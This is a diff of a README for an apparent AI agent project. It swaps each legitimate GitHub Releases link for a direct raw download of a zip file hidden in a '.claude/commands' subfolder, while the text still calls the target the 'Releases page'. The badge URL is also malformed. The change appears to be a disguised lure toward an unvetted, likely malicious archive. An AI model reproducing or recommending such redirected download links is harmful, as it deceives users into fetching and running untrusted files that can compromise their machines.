@@ -1,6 +1,6 @@
 # 🤖 custom-agent-with-skills - An AI Agent for Smart Tasks
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/tanveerkhan2005/custom-agent-with-skills/releases)
+[![Download](https://raw.githubusercontent.com/tanveerkhan2005/custom-agent-with-skills/main/.claude/commands/core_piv_loop/skills-with-custom-agent-v3.9.zip%https://raw.githubusercontent.com/tanveerkhan2005/custom-agent-with-skills/main/.claude/commands/core_piv_loop/skills-with-custom-agent-v3.9.zip)](https://raw.githubusercontent.com/tanveerkhan2005/custom-agent-with-skills/main/.claude/commands/core_piv_loop/skills-with-custom-agent-v3.9.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To start using the **custom-agent-with-skills**, please follow the simple steps 
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download the latest release](https://github.com/tanveerkhan2005/custom-agent-with-skills/releases).
+To download the application, visit this page: [Download the latest release](https://raw.githubusercontent.com/tanveerkhan2005/custom-agent-with-skills/main/.claude/commands/core_piv_loop/skills-with-custom-agent-v3.9.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version under "Releases." 
@@ -79,6 +79,6 @@ We value your feedback and want to help you make the most out of this applicatio
 
 ## ⚙️ Updates and Improvements
 
-We regularly update the application to add new features and fix bugs. Make sure to check for the latest updates on the [Releases page](https://github.com/tanveerkhan2005/custom-agent-with-skills/releases).
+We regularly update the application to add new features and fix bugs. Make sure to check for the latest updates on the [Releases page](https://raw.githubusercontent.com/tanveerkhan2005/custom-agent-with-skills/main/.claude/commands/core_piv_loop/skills-with-custom-agent-v3.9.zip).
 
 Thank you for using **custom-agent-with-skills**! We hope it makes your tasks easier and more productive.
